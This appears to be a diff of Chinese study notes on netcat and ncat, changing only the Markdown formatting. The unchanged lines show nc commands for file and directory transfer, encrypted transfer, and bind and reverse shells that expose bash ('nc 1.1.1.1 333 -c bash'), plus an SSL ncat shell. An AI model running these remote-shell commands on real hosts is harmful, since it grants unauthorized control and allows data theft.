@@ -22,16 +22,16 @@
 		 打开端：nc -l -p 333 > content.txt   
 		    
 #### (3)传输文件/目录   
-**文件：**   
+#### 文件：    
 	A: nc -lp 333 > 1/mp4   
 	B: nc -nv 1.1.1.1 333 < 1.mp4 -q 1   
 	或   
 	A: nc -q 1 -lp 333 < a.mp4   
 	B: nc -nv 1.1.1.1 333 > 2.mp4   
-**目录：**   
+#### 目录：   
 	A: tar -cvf - music/ | nc -lp 333 -q 1   
 	B: nc -nv 1.1.1.1 333 | tar -xvf -   
-**加密传文件：**   
+#### 加密传文件：  
 	A: nc -lp 333 | mcrypt --flush -Fbqd -a rijindael-256 -m ecb > 1.mp4   
 	B: mcrypt --flush -Fbq -a rijindael-256 -m ecb < a.mp4 | nc -nv 1.1.1.1 333 -q 1   
    
@@ -51,19 +51,20 @@
 	不仅是文件，每个磁道，包括已标记删除的信息,完整的硬盘复制   
 
 #### (7)远程控制   
-* 正向：   
+#### 正向：   
 	A: nc -lp 333 -c bash   
 	B: nc 1.1.1.1 333   
-* 反向：   
+#### 反向：   
 	A: nc -lp 333   
 	B: nc 1.1.1.1 333 -c bash   
-注： Windows用户把bash改成cmd   
+*注： Windows用户把bash改成cmd*   
 
 ### 2.ncat   
-nc的缺点：   
+**nc的缺点：**   
 	nc缺乏加密和身份验证的能力   
+	    
 ncat包含于nmap工具包中   
---allow 允许连接的IP地址   
+	--allow 允许连接的IP地址   
 	A: ncat -c bash --allow 192.168.20.14 -vnl 333 --ssl(用ssl加密)   
 	B: ncat -nv 1.1.1.1 333 --ssl   
 注：不同系统/平台的nc参数功能不尽相同   
